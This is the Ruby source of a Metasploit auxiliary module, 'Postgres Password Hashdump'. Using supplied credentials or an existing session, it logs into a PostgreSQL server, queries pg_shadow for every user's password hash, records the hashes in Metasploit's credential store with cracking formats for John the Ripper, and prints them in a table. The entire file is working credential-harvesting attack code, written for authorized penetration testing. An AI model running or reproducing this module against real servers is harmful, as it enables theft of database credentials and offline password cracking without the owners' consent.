##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::OptionalSession::PostgreSQL

  def initialize
    super(
      'Name' => 'Postgres Password Hashdump',
      'Description' => %Q{
          This module extracts the usernames and encrypted password
        hashes from a Postgres server and stores them for later cracking.
      },
      'Author' => ['theLightCosine'],
      'License' => MSF_LICENSE
    )
    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
  end

  def username
    session ? session.client.params['username'] : datastore['USERNAME']
  end

  def database
    session ? session.client.params['database'] : datastore['DATABASE']
  end

  def password
    # The session or its client doesn't store the password
    session ? nil : datastore['PASSWORD']
  end

  def run_host(ip)
    self.postgres_conn = session.client if session
    # Query the Postgres Shadow table for username and password hashes and report them
    res = postgres_query('SELECT usename, passwd FROM pg_shadow', false)

    service_data = {
      address: postgres_conn.peerhost,
      port: postgres_conn.peerport,
      service_name: 'postgres',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
      realm_value: database
    }

    credential_data.merge!(service_data)

    # Error handling routine here, borrowed heavily from todb
    case res.keys[0]
    when :conn_error
      print_error("A Connection Error Occurred")
      return
    when :sql_error
      # We know the credentials worked but something else went wrong
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)

      case res[:sql_error]
      when /^C42501/
        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - Insufficient permissions."
        return
      else
        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{res[:sql_error]}"
        return
      end
    when :complete
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      }
      login_data.merge!(service_data)
      # We know the credentials worked and have admin access because we got the hashes
      login_data[:access_level] = 'Admin'
      create_credential_login(login_data)
      print_good("Query appears to have run successfully")
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'Postgres Server Hashes',
      'Indent' => 1,
      'Columns' => ['Username', 'Hash']
    )

    service_data = {
      address: postgres_conn.peerhost,
      port: postgres_conn.peerport,
      service_name: 'postgres',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    res[:complete].rows.each do |row|
      next if row[0].nil? or row[1].nil?
      next if row[0].empty? or row[1].empty?

      password = row[1]

      credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        private_data: password,
        username: row[0]
      }

      if password.start_with?('md5')
        credential_data[:private_type] = :postgres_md5
        credential_data[:jtr_format] = 'raw-md5,postgres'
      else
        credential_data[:private_type] = :nonreplayable_hash
      end

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)

      tbl << [row[0], password]
    end
    print_good("#{tbl.to_s}")

    postgres_logout if self.postgres_conn && session.blank?
  end

end
